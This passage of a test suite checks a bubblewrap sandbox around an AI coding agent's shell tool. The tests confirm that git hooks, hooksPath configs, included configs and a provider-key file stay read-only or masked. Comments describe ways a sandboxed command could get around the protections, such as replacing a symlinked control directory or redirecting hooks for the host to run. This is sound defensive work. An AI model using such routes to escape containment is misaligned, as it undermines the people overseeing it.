     * `git worktree remove` then failed with EBUSY halfway through, leaving the
     * worktree removed and its admin directory behind.
     */
    it('pins only the workspace top-level .git directory', () => {
      const host = hostWith({
        '/work': 'dir',
        '/work/.book': 'dir',
        '/work/.git': 'dir',
        '/work/.git/hooks': 'dir',
        '/work/.git/config': 'file',
        '/work/.git/modules/sub': 'dir',
        '/work/.git/modules/sub/config': 'file',
        '/work/.git/worktrees/wt': 'dir',
      });

      expect(
        protectedWorkspacePaths(WORKSPACE, host, { allowGitWrites: true }).pinnedDirectories,
      ).toEqual(['/work/.git']);
      // The read-only mode needs no pin: the git dir is a mount point through
      // its own read-only bind.
      expect(protectedWorkspacePaths(WORKSPACE, host).pinnedDirectories).toEqual([]);
      const roExec = buildSandboxExecution(
        '/usr/bin/bwrap',
        'true',
        WORKSPACE,
        sandboxSettings(),
        host,
      );
      expect(mountsFor(roExec.args, '/work/.git').flag).toBe('--ro-bind');
      expect(mountsFor(roExec.args, '/work/.git/modules/sub').index).toBe(-1);
    });

    /**
     * A git dir a `gitdir:` pointer names is resolved against the work tree the
     * pointer sits in, which for a submodule is not the workspace root: `sub/.git`
     * says `gitdir: ../.git/modules/sub`, and joining that onto the workspace
     * root names a directory outside it.
     */
    it('follows a work tree .git pointer to the git dir it names', () => {
      const host = hostWith(
        {
          '/work': 'dir',
          '/work/.book': 'dir',
          '/work/.git': 'dir',
          '/work/.git/hooks': 'dir',
          '/work/.git/modules/sub': 'dir',
          '/work/.git/modules/sub/config': 'file',
          '/work/sub': 'dir',
          '/work/sub/.git': 'file',
        },
        { '/work/sub/.git': 'gitdir: ../.git/modules/sub\n' },
      );

      const exec = buildSandboxExecution(
        '/usr/bin/bwrap',
        'true',
        WORKSPACE,
        gitWriteSettings(),
        host,
      );

      expect(mountsFor(exec.args, '/work/.git/modules/sub/config').flag).toBe('--ro-bind');
      // And in the read-only mode the same git dir, covered by its parent bind.
      const roExec = buildSandboxExecution(
        '/usr/bin/bwrap',
        'true',
        WORKSPACE,
        sandboxSettings(),
        host,
      );
      expect(mountsFor(roExec.args, '/work/.git/modules/sub').index).toBe(-1);
    });

    it('binds a submodule git dir reached through a symlink at its canonical path and does not refuse it', () => {
      // Unlike a control file, a nested git dir that is a symlink is bound at
      // its canonical path rather than refused: the whole directory is covered
      // by the bind so no replaced link can matter.
      const host = hostWith(
        {
          '/work': 'dir',
          '/work/.book': 'dir',
          '/work/.git': 'dir',
          '/work/.git/hooks': 'dir',
          '/work/.git/config': 'file',
          '/work/.git/modules': 'dir',
          '/work/.git/modules/sub': 'symlink',
          '/work/.git-sub-real': 'dir',
          '/work/.git-sub-real/hooks': 'dir',
          '/work/.git-sub-real/config': 'file',
        },
        {},
        { '/work/.git/modules/sub': '../../.git-sub-real' },
      );

      const exec = buildSandboxExecution(
        '/usr/bin/bwrap',
        'true',
        WORKSPACE,
        sandboxSettings(),
        host,
      );

      expect(mountsFor(exec.args, '/work/.git').flag).toBe('--ro-bind');
      expect(mountsFor(exec.args, '/work/.git-sub-real').flag).toBe('--ro-bind');
      expect(protectedWorkspacePaths(WORKSPACE, host).refusals).toEqual([]);
    });

    it('protects the hooks directory core.hooksPath names inside the workspace', () => {
      // husky v9 does exactly this: `core.hooksPath = .husky/_`. The git dir's
      // own `hooks/` is read-only, but the directory git would actually run
      // hooks from was left writable, so a config this namespace protects was a
      // hooks directory it never looked at.
      const host = hostWith(
        {
          '/work': 'dir',
          '/work/.book': 'dir',
          '/work/.git': 'dir',
          '/work/.git/hooks': 'dir',
          '/work/.git/config': 'file',
          '/work/.husky/_': 'dir',
        },
        { '/work/.git/config': '[core]\n\thooksPath = .husky/_\n' },
      );

      const exec = buildSandboxExecution(
        '/usr/bin/bwrap',
        'true',
        WORKSPACE,
        sandboxSettings(),
        host,
      );

      expect(mountsFor(exec.args, '/work/.husky/_').flag).toBe('--ro-bind');
    });

    it('protects a hooksPath outside the git dirs in the read-only mode too', () => {
      // In the read-only mode the git dir itself is covered, but the walk still
      // reads its config: a `core.hooksPath` it declares names a directory the
      // whole-dir bind does not cover. This is the one git-derived protection
      // the default keeps emitting.
      const host = hostWith(
        {
          '/work': 'dir',
          '/work/.book': 'dir',
          '/work/.git': 'dir',
          '/work/.git/hooks': 'dir',
          '/work/.git/config': 'file',
          '/work/.husky/_': 'dir',
        },
        { '/work/.git/config': '[core]\n\thooksPath = .husky/_\n' },
      );

      const roExec = buildSandboxExecution(
        '/usr/bin/bwrap',
        'true',
        WORKSPACE,
        sandboxSettings(),
        host,
      );

      expect(mountsFor(roExec.args, '/work/.husky/_').flag).toBe('--ro-bind');
    });

    it('masks a hooksPath inside the workspace that does not exist yet', () => {
      const host = hostWith(
        {
          '/work': 'dir',
          '/work/.book': 'dir',
          '/work/.git': 'dir',
          '/work/.git/hooks': 'dir',
          '/work/.git/config': 'file',
        },
        { '/work/.git/config': '[core]\n\thooksPath = .husky\n' },
      );

      const exec = buildSandboxExecution(
        '/usr/bin/bwrap',
        'true',
        WORKSPACE,
        sandboxSettings(),
        host,
      );

      const husky = mountsFor(exec.args, '/work/.husky');
      expect(husky.flag).toBe('--tmpfs');
      expect(exec.args.slice(husky.index - 1, husky.index + 2)).toEqual([
        '--tmpfs',
        '/work/.husky',
        '--remount-ro',
      ]);
    });

    it('emits no --tmpfs mask under .git when core.hooksPath names an absent directory inside .git', () => {
      // In read-only mode, any mount inside a bound git dir is dropped, so a
      // --tmpfs mask for an absent hooksPath under .git is not emitted and
      // bwrap does not fail to create the mount point inside the read-only bind.
      const host = hostWith(
        {
          '/work': 'dir',
          '/work/.book': 'dir',
          '/work/.git': 'dir',
          '/work/.git/hooks': 'dir',
          '/work/.git/config': 'file',
        },
        {
          '/work/.git/config': '[core]\n\thooksPath = .git/custom-hooks\n',
        },
      );

      const exec = buildSandboxExecution(
        '/usr/bin/bwrap',
        'true',
        WORKSPACE,
        sandboxSettings(),
        host,
      );

      expect(mountsFor(exec.args, '/work/.git').flag).toBe('--ro-bind');
      expect(exec.args).not.toContain('/work/.git/custom-hooks');
    });

    it('leaves a hooksPath outside the workspace alone', () => {
      // Nothing binds it writable, so there is nothing to protect, and mounting
      // it would show a sandboxed command another repository's hooks.
      const host = hostWith(
        {
          '/work': 'dir',
          '/work/.book': 'dir',
          '/work/.git': 'dir',
          '/work/.git/hooks': 'dir',
          '/work/.git/config': 'file',
        },
        { '/work/.git/config': '[core]\n\thooksPath = /home/book/.hooks\n' },
      );

      const exec = buildSandboxExecution(
        '/usr/bin/bwrap',
        'true',
        WORKSPACE,
        sandboxSettings(),
        host,
      );

      expect(exec.args.join(' ')).not.toContain('/home/book/.hooks');
    });

    it('reads hooksPath out of config.worktree too, and only from [core]', () => {
      const linked = hostWith(
        {
          '/work': 'dir',
          '/work/.book': 'dir',
          '/work/.git': 'file',
          '/work/.git-data': 'dir',
          '/work/.git-data/hooks': 'dir',
          '/work/.git-data/config.worktree': 'file',
        },
        {
          '/work/.git': 'gitdir: .git-data\n',
          '/work/.git-data/config.worktree':
            '[core]\n\thooksPath = .husky\n[other "x"]\n\thookspath = .decoy\n',
        },
      );

      const exec = buildSandboxExecution(
        '/usr/bin/bwrap',
        'true',
        WORKSPACE,
        sandboxSettings(),
        linked,
      );

      // `config.worktree` belongs to the linked worktree, whose work tree root
      // the `gitdir` file names — here the workspace itself.
      expect(mountsFor(exec.args, '/work/.husky').flag).toBe('--tmpfs');
      expect(exec.args.join(' ')).not.toContain('.decoy');
    });

    it('ignores a gitdir or commondir that names a plain file', () => {
      // The pointer text is workspace-controlled. `<file>/hooks` is not a
      // directory bubblewrap can mount, and it aborts the whole invocation with
      // "Not a directory" — so a sandboxed command could break every later
      // sandboxed command just by writing that one pointer.
      const host = hostWith(
        {
          '/work': 'dir',
          '/work/.book': 'dir',
          '/work/.git': 'file',
          '/work/not-a-dir': 'file',
        },
        { '/work/.git': 'gitdir: not-a-dir\n' },
      );

      const exec = buildSandboxExecution(
        '/usr/bin/bwrap',
        'true',
        WORKSPACE,
        sandboxSettings(),
        host,
      );

      expect(exec.args.join(' ')).not.toContain('not-a-dir/');
    });

    it('treats a git dir whose name merely starts with .. as inside the workspace', () => {
      // The old check was lexical — `relative.startsWith('..')` — so a directory
      // called `..meta` read as being outside its own workspace and went
      // unprotected. Containment is `isOutside` now, which only a real parent
      // step satisfies.
      const host = hostWith(
        {
          '/work': 'dir',
          '/work/.book': 'dir',
          '/work/.git': 'file',
          '/work/..meta/gitdir': 'dir',
          '/work/..meta/gitdir/hooks': 'dir',
        },
        { '/work/.git': 'gitdir: ..meta/gitdir\n' },
      );

      const exec = buildSandboxExecution(
        '/usr/bin/bwrap',
        'true',
        WORKSPACE,
        sandboxSettings(),
        host,
      );

      expect(mountsFor(exec.args, '/work/..meta/gitdir').flag).toBe('--ro-bind');
    });
  });

  /**
   * `core.hooksPath` is the one setting that moves the hook directory out of the
   * git dir, and it is read from a file the sandboxed command's own workspace
   * holds. Git's rules for finding it — which `[core]` counts, how a value ends,
   * and that an `[include]`d file is part of the same config — are what the
   * parser has to follow, or it protects a directory git never runs from.
   */
  describe('core.hooksPath and the config files git includes', () => {
    const withConfig = (config: string, extra: Record<string, 'dir' | 'file'> = {}) =>
      hostWith(
        {
          '/work': 'dir',
          '/work/.book': 'dir',
          '/work/.git': 'dir',
          '/work/.git/hooks': 'dir',
          '/work/.git/config': 'file',
          ...extra,
        },
        { '/work/.git/config': config },
      );

    const mounts = (host: SandboxHost): string[] => {
      const exec = buildSandboxExecution(
        '/usr/bin/bwrap',
        'true',
        WORKSPACE,
        sandboxSettings(),
        host,
      );
      return exec.args;
    };

    /** Git takes the last value, so every one of them has to be protected. */
    it('protects every hooksPath a config declares, not only the first', () => {
      const args = mounts(
        withConfig('[core]\n\thooksPath = .one\n\thooksPath = .two\n', {
          '/work/.one': 'dir',
          '/work/.two': 'dir',
        }),
      );

      expect(mountsFor(args, '/work/.one').flag).toBe('--ro-bind');
      expect(mountsFor(args, '/work/.two').flag).toBe('--ro-bind');
    });

    it('ends a value at an unquoted ; or # comment, as git does', () => {
      const args = mounts(
        withConfig(
          '[core]\n\thooksPath = .husky ; keep this out of the path\n\thooksPath = "#.quoted"\n',
          { '/work/.husky': 'dir' },
        ),
      );

      expect(mountsFor(args, '/work/.husky').flag).toBe('--ro-bind');
      // The comment is not part of the path, and a `#` inside quotes is.
      expect(args.join(' ')).not.toContain('keep this out');
      expect(args).toContain('/work/#.quoted');
    });

    it('counts [core] case-insensitively and ignores a [core "x"] subsection', () => {
      expect(
        readCoreHooksPaths('[CORE]\n\thooksPath = .real\n[core "x"]\n\thooksPath = .decoy\n'),
      ).toEqual(['.real']);
    });

    it('reads the include and includeIf path values a config declares', () => {
      expect(
        readGitConfigIncludes(
          '[include]\n\tpath = shared/hooks\n[includeIf "gitdir:~/work/"]\n\tpath = work/hooks\n' +
            '[includeIf "onbranch:main"]\n\tpathfile = other/hooks\n',
        ),
      ).toEqual(['shared/hooks', 'work/hooks']);
    });

    it('protects an included config inside the workspace and the hooks it names', () => {
      const host = hostWith(
        {
          '/work': 'dir',
          '/work/.book': 'dir',
          '/work/.git': 'dir',
          '/work/.git/hooks': 'dir',
          '/work/.git/config': 'file',
          '/work/.git/conf.d': 'dir',
          '/work/.git/conf.d/hooks': 'file',
          '/work/.husky': 'dir',
        },
        {
          // Relative to the including file's own directory, which is the git dir.
          '/work/.git/config': '[include]\n\tpath = conf.d/hooks\n',
          '/work/.git/conf.d/hooks': '[core]\n\thooksPath = .husky\n',
        },
      );

      const args = mounts(host);
      // In the default read-only mode, the git dir bind covers conf.d/hooks,
      // and .husky outside the git dir is bound read-only.
      expect(mountsFor(args, '/work/.git').flag).toBe('--ro-bind');
      expect(mountsFor(args, '/work/.husky').flag).toBe('--ro-bind');

      // With git writes opted back on, the included config is protected file by file.
      const writeableArgs = buildSandboxExecution(
        '/usr/bin/bwrap',
        'true',
        WORKSPACE,
        sandboxSettings({ filesystem: { allowGitWrites: true } }),
        host,
      ).args;
      expect(mountsFor(writeableArgs, '/work/.git/conf.d/hooks').flag).toBe('--ro-bind');
      expect(mountsFor(writeableArgs, '/work/.husky').flag).toBe('--ro-bind');
    });

    it('stops following includes that name each other', () => {
      const args = mounts(
        hostWith(
          {
            '/work': 'dir',
            '/work/.book': 'dir',
            '/work/.git': 'dir',
            '/work/.git/hooks': 'dir',
            '/work/.git/config': 'file',
            '/work/conf/a': 'file',
            '/work/conf/b': 'file',
          },
          {
            '/work/.git/config': '[include]\n\tpath = ../conf/a\n',
            '/work/conf/a': '[include]\n\tpath = b\n',
            '/work/conf/b': '[include]\n\tpath = a\n',
          },
        ),
      );

      expect(mountsFor(args, '/work/conf/a').flag).toBe('--ro-bind');
      expect(mountsFor(args, '/work/conf/b').flag).toBe('--ro-bind');
    });

    /** A truncated `hooksPath` is one that reads as "no hooks directory". */
    it('refuses the run rather than guess when a config is past the read cap', () => {
      const host = withConfig(`[core]\n${'# pad\n'.repeat(300_000)}\thooksPath = .husky\n`, {
        '/work/.husky': 'dir',
      });

      const { refusals, mounts: emitted } = protectedWorkspacePaths(WORKSPACE, host);

      expect(refusals).toHaveLength(1);
      expect(refusals[0]).toMatchObject({ path: '/work/.git/config' });
      expect(describeControlPathRefusal(refusals[0]!)).toContain('/work/.git/config');
      // Nothing protected from the half a config it could not read.
      expect(mountsFor(mounts(host), '/work/.husky').index).toBe(-1);
      expect(emitted.some((mount) => mount.path === '/work/.husky')).toBe(false);
    });

    it('does not emit a tmpfs mask under a present read-only .book when core.hooksPath is .book/hooks and absent', () => {
      const host = hostWith(
        {
          '/work': 'dir',
          '/work/.book': 'dir',
          '/work/.git': 'dir',
          '/work/.git/hooks': 'dir',
          '/work/.git/config': 'file',
        },
        {
          '/work/.git/config': '[core]\n\thooksPath = .book/hooks\n',
        },
      );

      const exec = buildSandboxExecution(
        '/usr/bin/bwrap',
        'true',
        WORKSPACE,
        sandboxSettings(),
        host,
      );

      expect(mountsFor(exec.args, '/work/.book').flag).toBe('--ro-bind');
      expect(mountsFor(exec.args, '/work/.book/hooks').index).toBe(-1);
    });
  });

  /**
   * `.book` is a file a repository can ship as a symlink, and bubblewrap aborts
   * the whole invocation on either shape — `--tmpfs` cannot mkdir through a
   * dangling link, and a link to a directory is "Can't bind mount". A clone could
   * therefore break every sandboxed command in the workspace.
   */
  describe('control paths that are symlinks', () => {
    const symlinked = (path: string, target: string, extra: Record<string, 'dir' | 'file'> = {}) =>
      hostWith({ '/work': 'dir', [path]: 'symlink', ...extra }, {}, { [path]: target });

    const refusalsFor = (host: SandboxHost, options = {}) =>
      protectedWorkspacePaths(WORKSPACE, host, options).refusals;

    /**
     * Protecting the link's target is not enough, because the link itself sits in
     * the writable workspace: `rm .book && mkdir .book && …` replaces it, and the
     * target protection then guards a file nothing reads. There is no mount bwrap
     * can make that pins the link, so the run is refused instead.
     */
    it('refuses a symlinked control directory, naming the path', () => {
      const refusals = refusalsFor(
        symlinked('/work/.book', '.book-real', { '/work/.book-real': 'dir' }),
      );

      expect(refusals).toHaveLength(1);
      expect(refusals[0]).toMatchObject({ path: '/work/.book' });
      expect(describeControlPathRefusal(refusals[0]!)).toMatch(
        /\/work\/\.book is a symlink[\s\S]*cannot protect a symlinked control path/,
      );
      // And nothing is mounted for it: a mount would abort bwrap, and the run is
      // refused before any argv exists.
      const exec = buildSandboxExecution(
        '/usr/bin/bwrap',
        'true',
        WORKSPACE,
        sandboxSettings(),
        symlinked('/work/.book', '.book-real', { '/work/.book-real': 'dir' }),
      );
      expect(exec.args).not.toContain('/work/.book');
      expect(exec.args.join(' ')).not.toContain('.book-real');
    });

    it.each(['/work/.git', '/work/.bookrc.json'])('refuses a symlinked %s', (path) => {
      const kind = path.endsWith('.json') ? 'file' : 'dir';
      const refusals = refusalsFor(
        symlinked(path, `elsewhere${kind}`, { [`elsewhere${kind}`]: kind }),
      );

      expect(refusals[0]).toMatchObject({ path });
    });

    it('refuses a symlinked hooks directory', () => {
      // Under `allowGitWrites: true` the hooks directory is one of the per-file
      // control paths, and a symlinked one is refused like every other.
      const host = hostWith(
        {
          '/work': 'dir',
          '/work/.book': 'dir',
          '/work/.git': 'dir',
          '/work/.git/hooks': 'symlink',
          '/work/hooks-real': 'dir',
        },
        {},
        { '/work/.git/hooks': '../hooks-real' },
      );

      expect(refusalsFor(host, { allowGitWrites: true })).toHaveLength(1);
      expect(refusalsFor(host, { allowGitWrites: true })[0]).toMatchObject({
        path: '/work/.git/hooks',
      });
      // In both modes, a symlinked hooks directory is refused:
      expect(refusalsFor(host)).toHaveLength(1);
      expect(refusalsFor(host)[0]).toMatchObject({
        path: '/work/.git/hooks',
      });
    });

    it('refuses a git dir reached through a symlink in the workspace (gd shape) in both modes', () => {
      const host = hostWith(
        {
          '/work': 'dir',
          '/work/.book': 'dir',
          '/work/.git': 'file',
          '/work/gd': 'symlink',
          '/work/.git-real': 'dir',
          '/work/.git-real/hooks': 'dir',
          '/work/.git-real/config': 'file',
        },
        {
          '/work/.git': 'gitdir: gd\n',
        },
        {
          '/work/gd': '.git-real',
        },
      );

      const roPaths = protectedWorkspacePaths(WORKSPACE, host);
      expect(roPaths.refusals).toContainEqual({
        path: '/work/gd',
        reason: 'symlinked-control-path',
      });

      const optOutPaths = protectedWorkspacePaths(WORKSPACE, host, { allowGitWrites: true });
      expect(optOutPaths.refusals).toContainEqual({
        path: '/work/gd',
        reason: 'symlinked-control-path',
      });
    });

    it('refuses .git/modules/x symlink in opt-out mode, but binds it in read-only mode', () => {
      const host = hostWith(
        {
          '/work': 'dir',
          '/work/.book': 'dir',
          '/work/.git': 'dir',
          '/work/.git/hooks': 'dir',
          '/work/.git/config': 'file',
          '/work/.git/modules': 'dir',
          '/work/.git/modules/x': 'symlink',
          '/work/.git-sub-real': 'dir',
          '/work/.git-sub-real/hooks': 'dir',
          '/work/.git-sub-real/config': 'file',
        },
        {},
        { '/work/.git/modules/x': '../../.git-sub-real' },
      );

      const roPaths = protectedWorkspacePaths(WORKSPACE, host);
      expect(roPaths.refusals).toEqual([]);

      const optOutPaths = protectedWorkspacePaths(WORKSPACE, host, { allowGitWrites: true });
      expect(optOutPaths.refusals).toContainEqual({
        path: '/work/.git/modules/x',
        reason: 'symlinked-control-path',
      });
    });

    it('skips a control path that is neither a file nor a directory', () => {
      // A FIFO, a socket or a device has no mount bwrap can make over it, and
      // passing one aborts the invocation. Nothing to protect, so nothing is
      // emitted and the command runs.
      const host = hostWith({
        '/work': 'dir',
        '/work/.book': 'fifo',
        '/work/.git': 'dir',
        '/work/.git/hooks': 'dir',
        '/work/.git/config': 'file',
      } as unknown as Record<string, 'dir' | 'file' | 'symlink'>);

      const exec = buildSandboxExecution(
        '/usr/bin/bwrap',
        'true',
        WORKSPACE,
        sandboxSettings(),
        host,
      );

      expect(exec.args.join(' ')).not.toContain('/work/.book');
      // The rest of the protections are still there. The git dir is bound
      // read-only by default, which is also what the hooks dir rides on.
      expect(mountsFor(exec.args, '/work/.git').flag).toBe('--ro-bind');
      // ...and a shape bwrap cannot mount is not a refusal: nothing is being
      // protected that the host would otherwise read.
      expect(refusalsFor(host)).toEqual([]);
    });
  });

  /**
   * `.book/settings.local.json` is the file a user puts a provider key in, and
   * the namespace shares the host network — so read-only is not enough, the
   * contents have to be unreadable inside it.
   */
  describe('settings.local.json and the legacy rc file', () => {
    it('masks an existing settings.local.json after the .book bind', () => {
      const host = hostWith({
        '/work': 'dir',
        '/work/.book': 'dir',
        '/work/.book/settings.local.json': 'file',
      });

      const exec = buildSandboxExecution(
        '/usr/bin/bwrap',
        'true',
        WORKSPACE,
        sandboxSettings(),
        host,
      );

      const index = exec.args.indexOf('/work/.book/settings.local.json');
      expect(exec.args[index - 2]).toBe('--ro-bind');
      expect(exec.args[index - 1]).toBe('/dev/null');
      // After the directory bind, or the mask would be mounted under nothing.
      expect(index).toBeGreaterThan(mountsFor(exec.args, '/work/.book').index);
    });

    it('binds an existing .bookrc.json read-only', () => {
      // The host reads the legacy file on the next launch, and its `baseUrl`
      // wins over every settings layer (src/config.ts).
      const host = hostWith({
        '/work': 'dir',
        '/work/.book': 'dir',
        '/work/.bookrc.json': 'file',
      });

      const exec = buildSandboxExecution(
        '/usr/bin/bwrap',
        'true',
        WORKSPACE,
        sandboxSettings(),
        host,
      );

      expect(mountsFor(exec.args, '/work/.bookrc.json').flag).toBe('--ro-bind');
    });

    it('mounts neither when neither exists', () => {
      const host = hostWith({ '/work': 'dir' });

      const exec = buildSandboxExecution(
        '/usr/bin/bwrap',
        'true',
        WORKSPACE,
        sandboxSettings(),
        host,
      );

      // A file cannot be masked (bwrap rejects a tmpfs over a file path), so an
      // absent one is simply not mounted.
      expect(exec.args).not.toContain('/work/.bookrc.json');
      expect(exec.args).not.toContain('/work/.book/settings.local.json');
    });

    /**
     * `--ro-bind /dev/null <dir>` is "Is a directory", and bwrap aborts the whole
     * invocation on it — so one repository that ships `.book/settings.local.json`
     * as a directory breaks *every* sandboxed command in the workspace, not just
     * its own.
     */
    it('masks only a regular file, never a directory', () => {
      const host = hostWith({
        '/work': 'dir',
        '/work/.book': 'dir',
        '/work/.book/settings.local.json': 'dir',
      });

      const exec = buildSandboxExecution(
        '/usr/bin/bwrap',
        'true',
        WORKSPACE,
        sandboxSettings(),
        host,
      );

      expect(exec.args).not.toContain('/work/.book/settings.local.json');
      expect(exec.args.join(' ')).not.toContain('/dev/null');
      // The read-only `.book` bind is still there, so the namespace is still
      // buildable and the command still runs.
      expect(mountsFor(exec.args, '/work/.book').flag).toBe('--ro-bind');
    });
  });

  /**
   * A user who genuinely needs to write inside a protected path — a hook
   * installer writing `.git/hooks/pre-commit`, a cache under `.book/cache` —
   * could not, because the protected mounts were emitted after every
   * `allowWrite` bind and shadowed them.
   */
  describe('allowWrite over a protected path', () => {
    const host = () =>
      hostWith({
        '/work': 'dir',
        '/work/.book': 'dir',
        '/work/.book/cache': 'dir',
        '/work/.git': 'dir',
        '/work/.git/hooks': 'dir',
        '/work/.git/config': 'file',
      });

    it('applies an entry at or under a protected path after it, so the opt-in wins', () => {
      const settings = sandboxSettings();
      settings.filesystem.allowWrite = ['/work/.book/cache', '/work/.git/hooks'];

      const exec = buildSandboxExecution('/usr/bin/bwrap', 'true', WORKSPACE, settings, host());

      // Both are writable inside the namespace: the read-write bind is the last
      // mount of the path, so it is the one in force.
      expect(lastMountFor(exec.args, '/work/.book/cache').flag).toBe('--bind');
      expect(lastMountFor(exec.args, '/work/.git/hooks').flag).toBe('--bind');
      // ...and the entries are applied after the read-only mounts that would
      // otherwise shadow them.
      expect(lastMountFor(exec.args, '/work/.book/cache').index).toBeGreaterThan(
        mountsFor(exec.args, '/work/.book').index,
      );
      expect(lastMountFor(exec.args, '/work/.git/hooks').index).toBeGreaterThan(
        mountsFor(exec.args, '/work/.git/config').index,
      );
    });

    it('leaves an entry above a protected path before it, so a broad root cannot reopen it', () => {
      // The workspace itself, or any parent of it: binding it read-write is
      // where it was anyway, and letting it come after the protections would
      // turn the default back off again.
      const settings = sandboxSettings();
      settings.filesystem.allowWrite = ['/work'];

      const exec = buildSandboxExecution('/usr/bin/bwrap', 'true', WORKSPACE, settings, host());

      expect(mountsFor(exec.args, '/work/.book').index).toBeGreaterThan(
        mountsFor(exec.args, '/work').index,
      );
      // The whole `.git` is a protected mount by default, so it too stays after
      // the broad root.
      expect(mountsFor(exec.args, '/work/.git').index).toBeGreaterThan(
        mountsFor(exec.args, '/work').index,
      );
    });

    /**
     * The opt-in binds come *after* the protected mounts, so an entry naming
     * `.book` put the whole directory back in reach — and with it the provider key
     * `settings.local.json` holds, which the mask exists to keep unreadable. The
     * mask is re-emitted after the opt-ins so the last mount of that path is
     * `/dev/null` again.
     */
    it('keeps the credential masked when an entry opens .book itself', () => {
      const withCredential = () =>
        hostWith({
          '/work': 'dir',
          '/work/.book': 'dir',
          '/work/.book/settings.local.json': 'file',
          '/work/.git': 'dir',
          '/work/.git/hooks': 'dir',
          '/work/.git/config': 'file',
        });
      const settings = sandboxSettings();
      settings.filesystem.allowWrite = ['/work/.book'];

      const exec = buildSandboxExecution(
        '/usr/bin/bwrap',
        'true',
        WORKSPACE,
        settings,
        withCredential(),
      );

      // The user's opt-in is honoured for the directory...
      expect(lastMountFor(exec.args, '/work/.book').flag).toBe('--bind');
      // ...and the credential is still the last thing mounted over the file: the
      // last appearance of that path in the argv is a bind of `/dev/null` onto it.
      const at = exec.args.lastIndexOf('/work/.book/settings.local.json');
      expect(exec.args.slice(at - 2, at + 1)).toEqual([
        '--ro-bind',
        '/dev/null',
        '/work/.book/settings.local.json',
      ]);
    });

    /**
     * In the opt-out mode (`allowGitWrites: true`) the pin is a writable
     * self-bind, so an `allowWrite` entry under the git dir emitted before it
     * is shadowed and silently does nothing.
     */
    it('applies an entry under the pinned git dir after the pin', () => {
      const writeable = sandboxSettings({ filesystem: { allowGitWrites: true } });
      writeable.filesystem.allowWrite = ['/work/.git/objects'];

      const exec = buildSandboxExecution(
        '/usr/bin/bwrap',
        'true',
        WORKSPACE,
        writeable,
        hostWith({
          '/work': 'dir',
          '/work/.book': 'dir',
          '/work/.git': 'dir',
          '/work/.git/hooks': 'dir',
          '/work/.git/config': 'file',
          '/work/.git/objects': 'dir',
        }),
      );

      const pin = mountsFor(exec.args, '/work/.git');
      expect(pin.flag).toBe('--bind');
      expect(mountsFor(exec.args, '/work/.git/objects').index).toBeGreaterThan(pin.index);
    });

    it('re-locks control paths strictly below an allowWrite opt-in on a git dir', () => {
      const settings = sandboxSettings();
      settings.filesystem.allowWrite = ['/work/.git'];

      const exec = buildSandboxExecution('/usr/bin/bwrap', 'true', WORKSPACE, settings, host());

      const optIn = lastMountFor(exec.args, '/work/.git');
      expect(optIn.flag).toBe('--bind');

      const hooksMount = lastMountFor(exec.args, '/work/.git/hooks');
      expect(hooksMount.flag).toBe('--ro-bind');
      expect(hooksMount.index).toBeGreaterThan(optIn.index);

      const configMount = lastMountFor(exec.args, '/work/.git/config');
      expect(configMount.flag).toBe('--ro-bind');
      expect(configMount.index).toBeGreaterThan(optIn.index);
    });

    it('does not re-lock a control path that is itself an allowWrite opt-in', () => {
      const settings = sandboxSettings();
      settings.filesystem.allowWrite = ['/work/.git/hooks'];

      const exec = buildSandboxExecution('/usr/bin/bwrap', 'true', WORKSPACE, settings, host());

      const hooksMount = lastMountFor(exec.args, '/work/.git/hooks');
      expect(hooksMount.flag).toBe('--bind');

      const roBindsAfter: number[] = [];
      for (let i = 0; i < exec.args.length; i++) {
        if (exec.args[i] === '/work/.git/hooks' && exec.args[i - 2] === '--ro-bind') {
          roBindsAfter.push(i);
        }
      }
      expect(roBindsAfter.filter((idx) => idx > hooksMount.index)).toEqual([]);
    });
  });
});

describe('unbindablePaths', () => {
  it('reports configured paths that cannot be applied', () => {
    const settings = sandboxSettings();
    settings.filesystem.denyRead = ['/definitely/not/real', '~/also-not-real-xyz'];
    settings.filesystem.allowWrite = [tmpdir()];
    expect(unbindablePaths(settings)).toEqual(['/definitely/not/real', '~/also-not-real-xyz']);
  });
});

/**
 * A shape the namespace cannot be built around is a decision, not an abort: the
 * refusal has to reach the model as words it can act on, before anything runs.
 * The sandbox is injected so the refusal is exercised on any host, bwrap or not.
 */
describe('decideSandboxExecution refuses a workspace it cannot protect', () => {
  const sandboxStub = { wrap: () => null, describe: () => 'stub' };

  it('refuses a symlinked control path, naming it', () => {
    const dir = mkdtempSync(join(tmpdir(), 'book-sbx-refuse-'));
    try {
      mkdirSync(join(dir, '.book-real'));
      symlinkSync('.book-real', join(dir, '.book'));

      const decision = decideSandboxExecution(
        {
          workspaceRoot: dir,
          sandbox: sandboxSettings(),
          runtime: { sandbox: () => sandboxStub },
        },
        'echo hi',
        dir,
      );

      expect(decision.sandboxed).toBe(false);
      expect(decision.exec).toBeUndefined();
      expect(decision.error).toContain(join(dir, '.book'));
      expect(decision.error).toMatch(/cannot protect a symlinked control path/);
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  });

  it('runs a workspace with no control path the namespace cannot build', () => {
    const dir = mkdtempSync(join(tmpdir(), 'book-sbx-ok-'));
    try {
      const decision = decideSandboxExecution(
        {
          workspaceRoot: dir,
          sandbox: sandboxSettings(),
          runtime: {
            sandbox: () => ({ wrap: () => ({ file: '/bwrap', args: [] }), describe: () => '' }),
          },
        },
        'echo hi',
        dir,
      );

      expect(decision.error).toBeUndefined();
      expect(decision.sandboxed).toBe(true);
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  });
});

describe('createSandbox', () => {
  it('returns null when sandbox.enabled is false', () => {
    expect(createSandbox(sandboxSettings({ enabled: false }))).toBeNull();
  });

  it('warns that domain rules cannot be enforced', () => {
    const settings = sandboxSettings();
    settings.network.allowedDomains = ['github.com'];
    const warnSpy = vi.spyOn(console, 'warn').mockImplementation(() => {});
    const sandbox = createSandbox(settings);
    if (sandbox) {
      expect(warnSpy.mock.calls.flat().join(' ')).toMatch(/domain rules cannot be enforced/i);
    }
    warnSpy.mockRestore();
  });

  it('throws when failIfUnavailable is true and the sandbox cannot be built', () => {
    const settings = sandboxSettings({ failIfUnavailable: true });
    try {
      expect(['object', 'null']).toContain(typeof createSandbox(settings));
    } catch (e) {
      expect(e).toBeInstanceOf(Error);
      expect((e as Error).message).toMatch(/bwrap|sandbox|Windows/i);
    }
  });
});

describe('Bash tool integration with sandbox', () => {
  let dir: string;
  const ctx = {
    workspaceRoot: '',
    env: {},
    sandbox: undefined as ResolvedSettings['sandbox'] | undefined,
  };

  beforeEach(() => {
    dir = mkdtempSync(join(tmpdir(), 'book-sandbox-'));
    ctx.workspaceRoot = dir;
  });
  afterEach(() => rmSync(dir, { recursive: true, force: true }));

